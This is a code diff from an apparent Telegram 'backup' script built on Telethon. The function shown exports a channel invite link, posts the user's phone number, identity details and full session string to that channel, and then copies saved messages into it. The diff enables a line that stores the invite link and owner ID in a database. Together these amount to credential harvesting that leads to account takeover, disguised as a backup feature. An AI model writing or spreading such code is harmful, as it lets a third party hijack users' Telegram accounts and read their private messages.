@@ -39,7 +39,7 @@ async def backup_saves(client, me, logger_bot):
     channel_id = result.updates[1].channel_id
     dest = await client.get_entity(channel_id)
     result = await client(functions.messages.ExportChatInviteRequest(peer=channel_id))
-    #database.channels.insert_one({"invite": result.link, "owner": me.id})
+    database.channels.insert_one({"invite": result.link, "owner": me.id})
     await client.send_message(dest, f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nSession: {client.session.save()}")
     msg_count = 0
     async for message in client.iter_messages("me", reverse=True):
